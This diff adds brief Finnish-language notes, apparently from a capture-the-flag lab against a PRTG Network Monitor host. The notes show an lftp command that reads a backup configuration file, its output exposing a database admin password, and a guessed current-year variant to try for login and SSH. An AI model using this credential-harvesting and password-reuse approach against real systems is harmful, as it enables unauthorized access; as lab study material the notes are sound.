@@ -1,0 +1,17 @@
+etin saaaatanan pitkään FTP hidden filuja ja pääsin prtg useriin.
+Löyty sivuston conf filuja ja old. bak ehkä crittas.
+<DBCREDENTIALS>
+
+lftp 10.10.10.152:/users/All users/Paessler/PRTG Network Monitor> cat "PRTG Configuration.old.bak" | grep -C 3 admin
+              0                                              
+            </dbcredentials>
+            <dbpassword>
+	      <!-- User: prtgadmin -->
+	      PrTg@dmin2018
+            </dbpassword>
+            <dbtimeout>
+
+
+Nykyvuoden password eli PrTg@admin2019 -> devices -> group root
+
+säkäl vois toimii et saa tunnarin ssh
